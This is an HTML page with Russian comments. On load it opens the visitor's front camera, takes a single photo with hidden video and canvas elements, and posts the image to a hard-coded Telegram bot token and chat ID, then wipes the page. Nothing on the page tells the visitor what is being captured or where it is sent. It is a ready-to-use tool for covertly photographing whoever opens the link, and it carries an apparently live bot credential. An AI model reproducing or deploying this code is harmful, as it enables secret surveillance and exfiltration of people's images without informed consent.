<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            background: #000; 
            color: white; 
            font-family: Arial, sans-serif; 
            text-align: center; 
            overflow: hidden; 
        }
        #status { 
            margin-top: 40vh; 
            font-size: 18px; 
        }
        .hidden { 
            display: none; 
        }
    </style>
</head>
<body>
    <div id="status">üîÑ –ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã...</div>
    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        // ==== –ù–ê–°–¢–†–û–ô–ö–ò ====
        const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0'; // –í–∞—à —Ç–æ–∫–µ–Ω
        const CHAT_ID = '1250741267'; // –í–∞—à chat ID
        const DELAY_BEFORE_CAPTURE = 100; // –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ —Å–Ω–∏–º–∫–æ–º (–º—Å)
        // ===================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');

        // –§—É–Ω–∫—Ü–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
        function updateStatus(text, isError = false) {
            statusDiv.textContent = text;
            statusDiv.style.color = isError ? '#ff4444' : '#44ff44';
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
        async function sendPhotoToTelegram(blob) {
            updateStatus('üì® –û—Ç–ø—Ä–∞–≤–ª—è—é —Ñ–æ—Ç–æ...');
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'auto_selfie.jpg');
            formData.append('caption', `ü§≥ –ê–≤—Ç–æ-—Å–µ–ª—Ñ–∏\nüìÖ ${new Date().toLocaleString()}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    updateStatus('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–∫—Ä–æ–µ—Ç—Å—è —á–µ—Ä–µ–∑ 3 —Å–µ–∫.');
                    setTimeout(() => { 
                        document.body.innerHTML = ''; // –î–µ–ª–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–ª–Ω–æ—Å—Ç—å—é –ø—É—Å—Ç–æ–π
                    }, 3000);
                } else {
                    updateStatus(`‚ùå –û—à–∏–±–∫–∞ Telegram: ${data.description}`, true);
                }
            } catch (error) {
                updateStatus(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${error.message}`, true);
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function startAutoSelfie() {
            try {
                updateStatus('üì° –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ...');
                
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é (—Å–µ–ª—Ñ–∏) –∫–∞–º–µ—Ä—É
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',  // 'user' = —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                updateStatus('üé• –ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞...');
                video.srcObject = stream;
                
                // –ñ–¥–µ–º —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã
                await new Promise(resolve => setTimeout(resolve, DELAY_BEFORE_CAPTURE));
                
                updateStatus('üì∏ –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...');
                
                // –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                stream.getTracks().forEach(track => track.stop());
                
                // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ JPG –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                canvas.toBlob(async (blob) => {
                    await sendPhotoToTelegram(blob);
                }, 'image/jpeg', 0.95);
                
            } catch (error) {
                updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`, true);
                setTimeout(() => {
                    document.body.innerHTML = '';
                }, 5000);
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('DOMContentLoaded', startAutoSelfie);
    </script>
</body>
</html>